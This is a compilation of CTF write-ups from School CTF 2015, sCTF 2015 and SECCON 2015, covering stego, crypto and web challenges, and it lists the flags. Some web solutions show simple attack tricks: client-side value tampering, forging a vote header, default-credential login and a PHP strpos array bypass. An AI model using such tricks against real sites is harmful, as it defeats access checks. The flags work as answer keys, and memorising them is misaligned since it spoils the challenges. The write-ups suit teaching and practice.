<pre><code>grep -o -e "&lt;e&gt;[^/]*&lt;/e&gt;" st2.html
&lt;e&gt;zero&lt;/e&gt;
...
&lt;e&gt;one&lt;/e&gt;
</code></pre>
<p>The output contains only zero and one words. So let's substitule them by 1 and 0 and translate to ASCII byte by byte. This python script does it.</p>
<p><code>solution.py:</code></p>
<pre><code>#!/usr/bin/env python
import re
import sys
f = open(sys.argv[1])
a = f.read()
b = ''.join(re.findall("&lt;e&gt;([^/]*)&lt;/e&gt;", a))
b = b.replace('zero', '0')
b = b.replace('one', '1')
print ''.join(map(lambda x: chr(int(x, 2)), [b[i:i+8] for i in xrange(0, len(b), 8)]))
f.close()
</code></pre>
<p><code>./solution.py st2.html</code></p>
<p><code>flag_is_this_is_a_simple_stego</code></p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Pure color

**Category:** Stegano
**Points:** 100
**Solves:** 
**Description:**

> White as after Tide! :D
> 
> 
> [Image](./image_c6a5567687720ec40a18f6860f32c8c730f2a223.png)


## Write-up

<div><h3>Pure color</h3><p>Reading the task description we could realize that it is all about colors. </p>
<p>If we look at the picture with an angle to the screen (do not work on cool retina screens :D) we could notice vary pale text <code>Flag is</code>. </p>
<p>So we need to try to change background color and then see the flag. The easiest way is just to use MS Paint.</p></div>

## Other write-ups and resources

* <https://en.internetwache.org/school-ctf-2015-writeups-06-11-2015/>
# School CTF Winter 2015: Hunger games

**Category:** Web
**Points:** 100
**Solves:** 
**Description:**

> Oh, that monkey is really annoying, can you feed it please?
> 
> 
> <http://sibears.ru:10023/>
> 
> 
> <http://sibears.ru:12023/>
> 
> 
> <http://sibears.ru:13023/>


## Write-up

<div><h3>Hunger games</h3><p>Monkey wants a banana but we cant choose it from select. We can change sending value using browser's developer tools (F12) or use simple javascript: </p>
<p><code>$("input").val("banana")</code></p>
<p>and then just submit the form with any checked input.</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Poetry of hacking

**Category:** Web
**Points:** 200
**Solves:** 
**Description:**

> Lawl, just added myself to the poetry quotations site :D L00k 4 "Johny Droptables" here!
> 
> 
> p.s. Also added a "flag" quote, can u find it? B]
> 
> <http://sibears.ru:10025/>
> 
> 
> <http://sibears.ru:12025/>
> 
> 
> <http://sibears.ru:13025/>


## Write-up

<div><h3>Poetry of hacking</h3><p>Site says that we can use "_" as a filler for letters that we've forgot.</p>
<p>Check whether we can use "<em>" it w/o any other letters replacing all letters in word "byron" with "</em>" and making a query. </p>
<p>We got a quote! So now just append one "_" to the querry until you get the flag.</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Voting fraud

**Category:** Web
**Points:** 400
**Solves:** 
**Description:**

> Hey! We heard you are good at hacking. We have a deal for you: we are interested in victory of our candidate in that voting. Lead "Swift" to win, every proof will be awarded!
> 
> <http://sibears.ru:10024/>
> 
> 
> <http://sibears.ru:12024/>
> 
> 
> <http://sibears.ru:13024/>


## Write-up

<div><h3>Voting fraud</h3><p>You need to lead Swift to win, so you need to know in what way service authorizes every vote. Looking to the network requests in developer tools (F12) or in Wireshark we can find out that it uses custom HTTP header <code>X-Vote-Sid</code>. </p>
<p>According to javascript <code>custom.js</code> its value is accured from input <code>$("#vote-ssid")</code> and seems random. So we should try to send a request with a value that looks exactly the same as given but little bit different, e.g. just change the last character.</p>
<p>The vote will be accepted, so now we can forge votes and lead Swift to win.</p>
<p>That task also has more tricky way to solve. Occasionly we can find out that votes are generated only if client is asking for this. So no checks from client = no votes. We just need to start voting, vote once for Swift and wait for its end.</p></div>

## Other write-ups and resources

* none yet
# Flufferduff

**Category:** Coding
**Points:** 20
**Author:** 
**Description:**

>We here at sCTF enjoy weird words.
>
>Let *(n) = d(n) - x(n) where x(n) is the sum of all odd numbers above 0 and before n, exclusive, and d(n) is the sum of all primes in the range of (0,n), exclusive.
>
>When *(n) is negative, we call this a flufferduff.
>
>Find the number of flufferduffs below 1000.


## Write-up

This problem is one of the more self-explanatory ones.
[Flufferduff Pastebin](http://pastebin.com/YgLBpNE5)

If your code doesn't work, sucks... I ain't bug-fixin dat shizzle.

If you brute forced the problem, I salute you!

##Flag
>991

## Other write-ups and resources


# aGFtcHduZXIz 

**Category:** Crypto
**Points:** 40
**Author:** 
**Description:**

>[Boop](http://pastebin.com/yEUZWrRd)

## Writeup

Wow, can they get anymore cryptic? xP
First task: Figure out the title

>aGFtcHduZXIz > Base64 > hampwner3

Looks like a username. Let's use our google-fu and check out the results.
We find a [Youtube](https://www.youtube.com/user/hampwner3) , a [RoosterTeeth](http://roosterteeth.com/hampwner3) and a [Quizlet](http://quizlet.com/hampwner3) ...

Trying the Youtube and RoosterTeeth doesn't get us anywhere, but the Quizlet contains a clue... Sir hampwner3's [spanish quiz](http://quizlet.com/11856164/spanish-cards-flash-cards/) has a [youtube link](https://www.youtube.com/watch?v=jlcTNS2TUhg) as the last term. 

Navigating to the video, we see Lux Ion's comment ...
>Wow cool video! フラグはハムです。﻿

This roughly translates to ...
> Flag is ham.

## Flag
>ham

## Other write-ups and resources# Cipherception 

**Category:** Crypto
**Points:** 35
**Author:** 
**Description:**

>OCBnbCB0bCAxMCBmZGFuIHlkIGxkIFlndiBydnogYmQgcG1qcHpkX2Z4Y3liY3R2X2FibGxiY2w=

>5Affine2 > 8Caesar > Atbash > B64

## Writeup

To begin solving the problem one must recognize that all the plain-text words given within the problems are simple encryption methods. With this in mind, and the obvious direction of the arrow, one can backtrack the ciphers to gain the plain-text.

>B64 > Atbash > 8Caesar > 5Affine2


```
Base64: 8 gl tl 10 fdan yd ld Ygv rvz bd pmjpzd_fxcybctv_abllbcl
```

Once the Atbash had been obtain, the chain of decryption is kept going:
```
Atbash: 8 to go 10 uwzm bw ow Bte iea yw knqkaw_ucxbyxge_zyooyxo
```

Atbash to Caesar with shift of 8:
```
8Caesar: 8 lg yg 10 more to go Tlw aws qo cficso_muptqpyw_rqggqpg
```

Affine with A coefficient of 5, B coefficient of 2. User had to remove all unnecessary plaintexts before running throgh Affine.

```
Caesar: Tlw aws qo cficso_muptqpyw_rqggqpg
Affine: The key is always_continue_digging
```

The key has now been successfully extracted.

## Flag
>always_continue_digging

## Other write-ups and resources
# Coney

**Category:** Crypto
**Points:** 60
**Author:** 
**Description:**

>![coney](coney.gif "Coney")

##Solution

Due to the name of the problem, the most logical thing to do was simply Google ```Graphics Interchange Format``` which would lead the user to the wikipedia page [GIF](http://en.wikipedia.org/wiki/GIF). After reading a bit one would notice the header (```47 49 46 38 37 61```) and the terminating (```3B```) hex of a standart GIF. After consulting a trusty hex editor it was noticed that while the header was correct, the terminating hexadecimal was not.

Due to the incorrect terminating hexadecimal one would assume that the file was merged with something else. After utilising wikipedia's page on [List of file signatures](http://en.wikipedia.org/wiki/List_of_file_signatures) and comparing possible files that could have merged, it was found a compressed file was is the cause.

Simply opening the file using WinZip, Winrar, or 7-Zip prompted a file name ```x```. The file contained:

>U2FsdGVkX1/seMYknjQGW971EboRgFcx+jfczzdSrWMjt1xwRrPnQBbEsz+Mt7dA4xxsOVB88e8VGl70

After some research on possible ciphers utilising the gif's content as reference, the user would've stumble upon the [Rabbit Cipher](http://en.wikipedia.org/wiki/Rabbit_%28cipher%29). Utilising a online rabid decipher and the key ```rabbit``` as guessed through the content of the image, the following was retrieved:

>The key is who_knew_there_is_a_rabbit_cipher


##Flag

>who_knew_there_is_a_rabbit_cipher

## Other write-ups and resources
# Crib Drag

**Category:** Crypto
**Points:** 35
**Author:** 
**Description:**

>2d0710181b01111f0817171401071c11091a0a
>3c091311111a1a0e180003120d1a0811091a0a

## Writeup

Using our google-fu, two very great resources emerge... [link 1](http://travisdazell.blogspot.com/2012/11/many-time-pad-attack-crib-drag.html) [link 2](https://cryptocult.wordpress.com/cyber-challenges/stanford-cryptography-i-programs/program-1/)


After loading the python in, we start guessing cribs.
```
"the" gives nothing good.
"you" gives "hav". We should try "have"
"have" gives "youl". We should try "youll"
"youll" gives "havef". We should try "havefun"
"havefun" gives "youllne". We should try "youllnever"
"youllnever" gives "havefungue". We should try "havefunguessing"
"havefunguessing" gives "youllneverguess"
```
It looks like part of our plaintext messages are "havefunguessing" and "youllneverguess", with the end missing. The missing part is the same though, "11091a0a". We should assume "11091a0a" = "this", so our messages are "havefunguessingthis" and "youllneverguessthis"


That's pretty much it. To find the key, we just xor the hex of our plain text with the encrypted to get the flag.
```
xor 2d0710181b01111f0817171401071c11091a0a with 796f756c6c6e65766572677565737374686973
output 54686574776f74696d65706164746f65617379
hextoascii 54686574776f74696d65706164746f65617379 to Thetwotimepadtoeasy
```

## Flag
>Thetwotimepadtoeasy

## Other write-ups and resources


#I Like Bacon 

**Category:** Crypto
**Points:** 15
**Author:** 
**Description:**

>... .- -- ..- . .-.. ..--.- -- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -... .- .- -... -... .- .- -... -... -... .- -... .- .- .- -... .- .- -... .- .- -... .- .- .- -... .- .- -... .- -... .- .- -... -... .- .- -... -... -... .- .- -... .- .- .- .- -... .- -... .- -... .- -... -... .- .- .- .- .- .- .- -... -... .-


## Writeup
This is a cryptography question. Looking at it, the question appears to be in [morse code](http://en.wikipedia.org/wiki/Morse_code). Plugging that into a morse code decrypter, we get the following message:

```
SAMUEL MORSE IS COOL BUT BACON IS COOLER BAABBAABBBABAAABAABAABAAABAABABAABBAABBBAABAAAABABABABBAAAAAAABBA
```

The returned string seems to contain some sort of diss and a new ciphered text. 

```
BAABBAABBBABAAABAABAABAAABAABABAABBAABBBAABAAAABABABABBAAAAAAABBA
```

Looking up [Bacon cipher](http://en.wikipedia.org/wiki/Bacon%27s_cipher), we find what the second message was encoded with. Utilizing an online decipher we receive the flag.

## Flag

>THISISTHEFLAG

## Other write-ups and resources


# MD5 

**Category:** Crypto
**Points:** 30
**Author:** 
**Description:**

>Given the following MD5 hash:

>0AB1A9222A15DA1159EB94212C5C8BAF

>There are 3 parts to the original text. The first part is a random number, 0-99 inclusive. The second part is a random letter, lowercase a-z inclusive. The third and final part is a random number, 0-999 inclusive.

>For example, 19f599 or 0a159 could be possible combinations. There are no 0's for blank spaces, for example 0a001 is not valid. It would be 0a1.

>Find the original text.

## Writeup
After been given an MD5 hash the user could either attempt to brute-force it, or utilise an online service to attempt to find the plain-text matching the hashed one.

Attempting to bruteforce it would take several hours depending on software utilised, and thus using an online database is the best option between the two (or at least worth a try).

Simply pasting the MD5 into [HashKiller.co.uk](http://www.hashkiller.co.uk/md5-decrypter.aspx) the user receives the flag.

## Flag
>15q478

## Other write-ups and resources
# MD5_2 

**Category:** Crypto
**Points:** 40
**Author:** 
**Description:**

>Given the following MD5 hash:


>2E561F52DF1F1A31B5C4A00D0C846728


>And that the alphanumeric all lowercase text is less than 8 characters, find the original text (the flag).

## Writeup
Very similiar to the first MD5 problem, the user could either attempt to bruteforce the MD5 hash or simply look within online databases.

Simply pasting the MD5 into [HashKiller.co.uk](http://www.hashkiller.co.uk/md5-decrypter.aspx) the user receives the flag.

## Flag
>581qq92

## Other write-ups and resources
# Q.E.S.

**Category:** Crypto
**Points:** 80
**Author:** 
**Description:**

>![seq](seq.png "seq")


## Writeup

Cryptic problem time! Where to start... We focus on the file name of the picture, seq.png. We assume seq stands for sequence, and we conclude the pattern in QES utilizes sequences. However when we try plugging the numbers into https://oeis.org/ , no known sequence is found. We have to assume that QES contains multiple sequences.

Anytime you have sequences, look for fibonacci numbers. CTFs LOVE fibonacci. Here I have highlighted the fibonacci terms I see...

![redSeq](http://tinyurl.com/qem7mgb "redSeq")

A suspiciously nice pattern... Every third term starting from the first is part of the fibonacci sequence. We try every third term starting from the second, and with the guiding hand of https://oeis.org/ we discover this second sequence is the lucas sequence! Finally, every third term starting from the third number forms the pentagonal numbers sequence.

![coloredSeq](http://tinyurl.com/qxsebx7 "coloredSeq")

From here, we need to complete the grid, a trivial task.

![fullColoredSeq](http://s16.postimg.org/pwvjc7g5x/QES.png "fullColoredSeq")

The flag is just the rest of the grid.

    13  29  70  21  47  92  34
    76  117 55  123 145 89  199
    176 144 322 210 233 521 247

##Flag

>13297021479234761175512314589199176144322210233521247

## Other write-ups and resources

# Cruel Guessing Game

**Category:** Pwnable
**Points:** 55
**Author:** 
**Description:**

>I'm thinking of an integer between 1 and 1000.
>
>python.sctf.io:11236
>
>My number is randomly generated each time you guess.

## Solution

http://pastebin.com/hnJ4c4Mr

## Flag
>thatwascruel

## Other write-ups and resources# Deceptive Ports 

**Category:** Pwnable
**Points:** 120
**Author:** 
**Description:**

>python.sctf.io:25565

## Writeup
We start this problem by accessing the port. 
Once we jump in, we are asked "Are you ready to rumble?" 
No matter your answer, the battle begins and we face our first enemy, SLUG!
After beating SLUG, we continue to face enemies until we reach SID, who has 5 attack compared to our 2.
Losing to SID is inevitable, and the game over screen gives us our hint. "If only you were invincible like Boss"
Hmmm... There isn't any obvious way to legitimately beat SID, so we have to cheat >:D
(http://en.wikipedia.org/wiki/Glossary_of_video_game_terms)

>"WIKIPEDIA HOW CAN I BE INVINCIBLE"

>"USE GODMODE"

We studiosly type ```godmode``` in our next game, and we get +99999999 health! 
Beating all the bosses is trivial, and after beating the final boss, BOSS HOSS, we get the flag.

## Flag
>godmode_is_best

## Other write-ups and resources
# sCTF 2015 Write-ups

* <http://compete.sctf.io/>
* [Scoreboard](http://compete.sctf.io/scoreboard.php)
* [Flags](https://compete.sctf.io/2015q1/solutions.php)

## Completed write-ups

* [coding/Flufferduff](coding/Flufferduff)
* [crypto/aGFtcHduZXIz](crypto/aGFtcHduZXIz)
* [crypto/Cipherception](crypto/Cipherception)
* [crypto/coney](crypto/coney)
* [crypto/Crib Drag](crypto/Crib Drag)
* [crypto/I Like Bacon](crypto/I Like Bacon)
* [crypto/MD5](crypto/MD5)
* [crypto/MD5_2](crypto/MD5_2)
* [crypto/qes](crypto/qes)
* [pwnable/Cruel Guessing Game](pwnable/Cruel Guessing Game)
* [pwnable/Deceptive Ports](pwnable/Deceptive Ports)
* [steganography/Graphics Interchange Format](steganography/Graphics Interchange Format)
* [trivia/Hello World](trivia/Hello World)
* [trivia/Survey](trivia/Survey)
* [trivia/That Sounds Delicious](trivia/That Sounds Delicious)
* [web/Every 7 Seconds](web/Every 7 Seconds)
* [web/Impromptu GET](web/Impromptu GET)
* [web/strpos](web/strpos)

## External write-ups only

* none yet

## Missing write-ups# Graphics Interchange Format 

**Category:** Steganography
**Points:** 15
**Author:** 
**Description:**


>![nod](the_nod.gif "Nod")


## Writeup
Due to the name of the problem, the most logical thing to do was simply Google ```Graphics Interchange Format``` which would lead the user to the wikipedia page [GIF](http://en.wikipedia.org/wiki/GIF). After reading a bit one would notice the header (```38 39 61```) and the terminating (```3B```) hex of a standart GIF. After consulting a trusty hex editor it was noticed everything was fine, and thus no modifications was done to the format in itself (joining files together, etc.). Despite the fact, a clear quirk can be seen at the end of the image, suggesting there is something within its bytes causing a sudden morph. 

If one was to start from the end of the files data upwards (as the quirk happens at the end of the GIF), between offset ```000E8E70``` and ```000E8F20``` one would find the following:

````

56 91 27 59 31 C3 0C 72 21 FD E9 09 FF 22 C3 72 4D 40 73 64 03 04 D4 C4 02 94 47 CB 2A 60 FD F8 E5 16 4D 00 4F 1B EA 20 86 20 38 88 A0 9F E0 F3 20 90 11 7C 1A 22 06 84 60 E2 94 23 BB 6E 17 77 2D 31 66 6C 61 67 69 73 67 61 6E 64 61 6C 66 74 68 65 62 65 73 74 01 12 D6 A0 06 50 00 05 5A 00 05 28 60 01 26 20 09 D8 A0 8B D9 20 0F 20 21 8C 21 41 11 26 61 12 C2 F8 11 B0 23 13 1E 41 94 20 CD 15 E2 00 0C 26 20 8E CF C0 0D 1C 21 0C 39 AD 30 0F 53 20 E6 31 19 7A 01 17 12 6C C1 18 01 10 38 A1 57 7B 75 0F EC E0 3E 0F 42 FB 04 42 20 F9
V‘'Y1Ã.r!ýé.ÿ"ÃrM@sd..ÔÄ.”GË*`ýøå.M.O.ê † 8ˆ Ÿàó ..|.".„`â”#»n.w-1flagisgandalfthebest..Ö .P..Z..(`.& .Ø ‹Ù . !Œ!A.&a.Âø.°#..A” Í.â..& ŽÏÀ..!.9.0.S æ1.z...lÁ...8¡W{u.ìà>.Bû.B ùÆo¶–FM..%ù.ÿ..2’

````

The flag is noticibly within the file.

##Flag

>gandalfthebest

## Other write-ups and resources# Hello World 

**Category:** Trivia
**Points:** 25
**Author:** 
**Description:**

>The flag is less than 8 characters.

>Have Fun

>NOTE: You don't have to run the problem to solve, and it isn't advised either.

## Writeup

The program was decompiled and ran through several IDAs to attempt to figure out its purpose, which after a bit of digging was to shut-down Windows. Alternately if one opened the program as a txt. there was a line that said CRASH WINDOWS.EXE, which could be confirmed due to a Blue Screen Of Death(BSOD) occuring after the program was run. After the multiple people complained about BSOD the admins posted a note to the problem (seen above). One was to guess the name of the program into the submit box.

##Flag

>qwerty

## Other write-ups and resources


# Survey - 10

**Category:** Trivia
**Points:** 10
**Author:** 
**Description:**

>It seems you have stumbled across some free points. You might  want to redeem them.
> Complete the survey and get them.
>It'd be appreciated if each member completes the survey for accurate information for future competitions.


>[Le Survey Link](https://docs.google.com/forms/d/1AK1-EG_77eYxtBpRAcMDaLnGTlhIVKOdFjT6TRFJkLs/viewform?entry.1461696298&entry.249747288&entry.1031054086&entry.1764513476&entry.1473821675=Superari&entry.823470739&entry.291297053)


## Writeup
As stated, this was free points. After completing the survey, the flag was given.

## Flag
>thatwaseasy

## Other write-ups and resources
# That Sounds Delicious

**Category:** Trivia
**Points:** 15
**Author:** 
**Description:**

>BLcvFJic

> highlighting:none

> expiration:never

> exposure:unlisted



## Writeup
This was a recon problem. The user was suppose to recognize (or research) the varibales given: ```highlighting```, ```expiration```, and ```exposure```. The user would eventually stumble upon [Pastebin.com](http://pastebin.com/), which the flag would've be found inside one of its pasties. We discover this as when we make a new paste, the url ends up being a random string of characters. Our title is much like one of these, and when we paste it in to see if there's a paste with that url, we get the flag.

> http://pastebin.com/BLcvFJic

The following was inside:

>wow you must use pastebin a lot

>here's your reward: chocolatepie


##Flag

>chocolatepie

## Other write-ups and resources
## Every 7 Seconds

**Category:** Web
**Points:** 65
**Author:** 
**Description:**

>[Sometimes, you gotta be quick.](http://compete.sctf.io/problems.php)

## Writeup

Hmmm... "Sometimes, you gotta be quick."
When do you need to be quick? When you and your friends are at a restaurant, and the cookies arrive, you have to be quick!
So we check the site's cookies.

>compete.sctf.io/Cookies/QuicklyNow

We get ```7730775f796f755f6172655f737065656479```
Simply translating this to ascii gives us the flag.

## Flag
>w0w_you_are_speedy

## Other write-ups and resources
# Impromptu GET 

**Category:** Web
**Points:** 65
**Author:** 
**Description:**

>Jonathan cloned our router online access page again... Model number BRL-04FXP by bRoad Lanner. Except there's been a slight issue, he didn't copy any of the elements on the page used to login and we lost the username and password, but there's some sensitive data we need to recover.
>
>Luckily it uses GET. So now it looks like we'll have to just pass the ```username```
> and ```password``` parameters manually. But, we just don't know the username and password...
>
>I'll hand you the [link](http://compete.sctf.io/problems/2015q1/impromptuget.php), maybe you can figure it out.

## Writeup

Going to the link the user will be greeted by a simple ```Incorrect.``` message. Following the information given by the problem, the user had to come up with a method to log-in to the page utilising PHP's GET.

>http://compete.sctf.io/problems/2015q1/impromptuget.php?username=&password=

We don't know what the usename or password was though. Looking in the problem again, they give us the router, which could be important. Researching the router given, ```BRL-04FXP by bRoad Lanner default password```, the user would find the default username to be ```blank``` and password ```0000```.

>http://compete.sctf.io/problems/2015q1/impromptuget.php?username=blank&password=0000

The page would now return:

> flag: getting_is_fun

## Flag

>getting_is_fun

## Other write-ups and resources
# strpos

**Category:** Web
**Points:** 45
**Author:** 
**Description:**

>[Try this one...](http://compete.sctf.io/problems/2015q1/jz/main.php)

## Writeup

Loading the website the user is greeted by an empty PHP page. Checking the source, one would find the following:

```php

<!--

CODE BACKUP ©SCTF CORPORATION EVEN THO WE AINT A CORPORATION:

$a = $_GET["plang"];
if(isset($a)) {
	if(strpos($a,"answer") !== false && strlen($a) < 2) {
		echo $flag;
	} else {
		echo "Sadly, yee hath given bad input.";
	}
}

-->

```

After analysing the code the user would figure the PHP script utilises a GET tag called ```plang```, and the statement in which the user must break to retrieve the flag is the following:

```php
if(strpos($a,"answer") !== false && strlen($a) < 2)
```

After some Googling it's found what ```strpos``` and ```strlen``` does:

>strpos — Find the position of the first occurrence of a substring in a string.

>strlen — Get string length.

The issue becomes evident. The variable submitted through ```plang``` must contain the string ```answer```, but must also be smaller than length ```2```, which is technically impossible. After some Googling on PHP variables and exploits, it's found that the compare statement ```==``` is (for lack of better terms) broken.

Simply running an array through ```plang``` one would validate both conditions within the if statement.

>http://compete.sctf.io/problems/2015q1/jz/main.php?plang[]

The following is displayed:

> arrays_and_strings

##Flag

>arrays_and_strings

## Other write-ups and resources# SECCON Quals CTF 2015: Exec dmesg

**Category:** Binary
**Points:** 300
**Solves:** 175
**Description:**

> Please find secret message from the iso linux image.
> 
> [image.zip](./image.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://pony7.fr/ctf:public:seccon:exec-dmesg>
* <http://gnoobz.com/seccon-online-ctf-2015-exec-dmesg.html>
* <https://github.com/dqi/ctf_writeup/tree/master/2015/seccon/binary/exec%20dmesg>
* [Japanese](http://miettal.hatenablog.com/entry/2015/12/07/104233)
* [Japanese](http://katc.hateblo.jp/entry/2015/12/06/185159)
* [Japanese](https://hackmd.io/s/EkG_hFsEx)
* [Japanese](http://hfukuda.hatenablog.com/entry/2015/12/07/235823)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQc)
# SECCON Quals CTF 2015: GDB Remote Debugging

**Category:** Binary
**Points:** 200
**Solves:** 60
**Description:**

> Decode the key
> 
> [putskey](./putskey)
> 
> [log.txt](./log.txt)


## Write-up

(TODO)

## Other write-ups and resources

* <https://pony7.fr/ctf:public:seccon:gdb-remote-debugging>
* [Japanese](https://hackmd.io/s/Nk4mKasNg)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: Individual Elebin

**Category:** Binary
**Points:** 200
**Solves:** 18
**Description:**

> Execute all ELF files
> 
> [Individual_Elebin.zip](./Individual_Elebin.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <http://blukat29.github.io/2015/12/seccon-ctf-2015-individual-elebin/>
* [Japanese](https://hackmd.io/s/E1gc7g3Vl)
* [Japanese](http://amiq11.tumblr.com/post/134657262324/seccon2015-writeup-eeic-advent-calendar-day-6)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: Reverse-Engineering Android APK 1

**Category:** Binary
**Points:** 100
**Solves:** 287
**Description:**

> Please win 1000 times in rock-paper-scissors
> 
> [rps.apk](./rps.apk)


## Write-up

(TODO)

## Other write-ups and resources

* <http://0xecute.com/index.php/2015/12/07/54/>
* <https://ascopectf.wordpress.com/2015/12/06/seccon2015reverse-engineering-android-apk-1binary100/>
* <http://blog.squareroots.de/en/2015/12/seccon-2015-online-ctf-reverse-engineering-android-apk-1/>
* [Japanese](http://akashisn.azurewebsites.net/2015/12/06/seccon-2015-online-ctf-write-up/)
* [Japanese](https://hackmd.io/s/EJdT9624x)
* [Japanese](http://hfukuda.hatenablog.com/entry/2015/12/07/235823)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: Reverse-Engineering Hardware 1

**Category:** Binary
**Points:** 400
**Solves:** 20
**Description:**

> We've found some pictures of a decoder board and a program to produce a nice text.
> 
> 
> Please help us to get the text.
> 
> 
> [gpio.py](./gpio.py)
> 
> 
> [ChristmasIllumiations.zip](https://github.com/SECCON/SECCON2015_online_CTF/blob/master/Binary/400_Reverse-Engineering%20Hardware%201/ChristmasIllumiations.zip)

[Alternative download](https://mega.nz/#!7Q8RESaY!kB0IIVdYi0suQDF1Hs50w_679D7ncJm32quPDa-zM0E)


## Write-up

(TODO)

## Other write-ups and resources

* [Japaanese](https://github.com/hideyuki/SECCON-2015-Online-CTF-Writeup/tree/master/Reverse-Engineering-Hardware-1)
* [Japanese](https://hackmd.io/s/4JhhsThNg)
* [Japanese](http://d.hatena.ne.jp/waidotto/20151206/1449409523)
* [Japanese](http://tech.beatrobo.com/blog/2015/12/06/seccon-2015-online-ctf-writeup/)
* [Japanese](http://amiq11.tumblr.com/post/134657262324/seccon2015-writeup-eeic-advent-calendar-day-6)
* [Japanese](http://www.iridoatelier.net/sb/log/eid269.html)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: Reverse-Engineering Hardware 2

**Category:** Binary
**Points:** 500
**Solves:** 10
**Description:**

> We've found an encoder board using double 74HC161s along with a binary file.
> 
> Please help us to decode it.
> 
> [gpio2.py](./gpio2.py)
> 
> [encripted](./encripted)
> 
> [counterhardware.zip](https://github.com/SECCON/SECCON2015_online_CTF/blob/master/Binary/500_Reverse-Engineering%20Hardware%202/counterhardware.zip)

[Alternative download](https://mega.nz/#!6EdBDSwb!4cNZUASZXn3hXw5DkEd0ntLQ1klt9u3X6hE8s_m1WWo)

## Write-up

(TODO)

## Other write-ups and resources

* <http://blukat29.github.io/2015/12/seccon-ctf-2015-hardware2/>
* [Japanese](https://github.com/hideyuki/SECCON-2015-Online-CTF-Writeup/tree/master/Reverse-Engineering-Hardware-2)
* [Japanese](https://hackmd.io/s/EylxpX2Ve)
* [Japanese](http://d.hatena.ne.jp/waidotto/20151206/1449409523)
* [Japanese](http://tech.beatrobo.com/blog/2015/12/06/seccon-2015-online-ctf-writeup/)
* [Japanese](http://amiq11.tumblr.com/post/134657262324/seccon2015-writeup-eeic-advent-calendar-day-6)
* [Japanese](http://www.iridoatelier.net/sb/log/eid269.html)
# SECCON Quals CTF 2015: Decrypt it

**Category:** Crypto
**Points:** 300
**Solves:** 199
**Description:**

> $ ./cryptooo SECCON{*************************}
> 
> Encrypted(44): waUqjjDGnYxVyvUOLN8HquEO0J5Dqkh/zr/3KXJCEnw=
> 
> 
> what's the key?
> 
> [cryptooo.zip](./cryptooo.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://pony7.fr/ctf:public:seccon:decrypt-it>
* <https://github.com/dqi/ctf_writeup/tree/master/2015/seccon/crypto/cryptooo>
* [Japanese](https://hackmd.io/s/4J7yitjVl)
* [Japanese](http://hfukuda.hatenablog.com/entry/2015/12/07/235823)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: Find the prime numbers

**Category:** Crypto
**Points:** 200
**Solves:** 54
**Description:**

> $ cp [pq.cgi](./pq.cgi) /var/www/[pq.cgi](./pq.cgi).txt
> 
> <http://pailler.quals.seccon.jp/[pq.cgi](./pq.cgi).txt>
> 
> <http://pailler.quals.seccon.jp/cgi-bin/[pq.cgi](./pq.cgi)>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/paillier_crypto_200#eng-version>
* [Japanese](https://hackmd.io/s/VJ42d6j4e)
* [Japanese](http://www.iridoatelier.net/sb/log/eid269.html)
# SECCON Quals CTF 2015: Please give me MD5 collision files

**Category:** Crypto
**Points:** 400
**Solves:** 5
**Description:**

> <http://md5.quals.seccon.jp/MD5_treivvwcxTx2/> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SECCON Quals CTF 2015: Unzip the file

**Category:** Crypto
**Points:** 100
**Solves:** 196
**Description:**

> Unzip the file
> 
> unzip


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/dqi/ctf_writeup/tree/master/2015/seccon/crypto/unzip>
* [Japanese](http://akashisn.azurewebsites.net/2015/12/06/seccon-2015-online-ctf-write-up/)
* [Japanese](http://kanpapa.com/today/2015/12/seccon-ctf-2015-online-write-up.html)
* [Japanese](https://hackmd.io/s/Nyejq6hNg)
* [Japanese](http://d.hatena.ne.jp/waidotto/20151206/1449409523)
* [Japanese](http://amiq11.tumblr.com/post/134657262324/seccon2015-writeup-eeic-advent-calendar-day-6)
* [Japanese](http://hfukuda.hatenablog.com/entry/2015/12/07/235823)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: Last Challenge (Thank you for playing)

**Category:** Exercises
**Points:** 50
**Solves:** 545
**Description:**

> ex1
> 
> Cipher:PXFR}QIVTMSZCNDKUWAGJB{LHYEO
> 
> Plain: ABCDEFGHIJKLMNOPQRSTUVWXYZ{}
> 
> 
> ex2
> 
> Cipher:EV}ZZD{DWZRA}FFDNFGQO
> 
> Plain: {HELLOWORLDSECCONCTF}
> 
> 
> quiz
> 
> Cipher:A}FFDNEA}}HDJN}LGH}PWO
> 
> Plain: ??????????????????????
> 
> 
> There is no bonus in this question


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/last_crypto_50#eng-version>
* <https://ascopectf.wordpress.com/2015/12/06/seccon2015last-challenge-thank-you-for-playingexercises50/>
* [Japanese](http://akashisn.azurewebsites.net/2015/12/06/seccon-2015-online-ctf-write-up/)
* [Japanese](http://kanpapa.com/today/2015/12/seccon-ctf-2015-online-write-up.html)
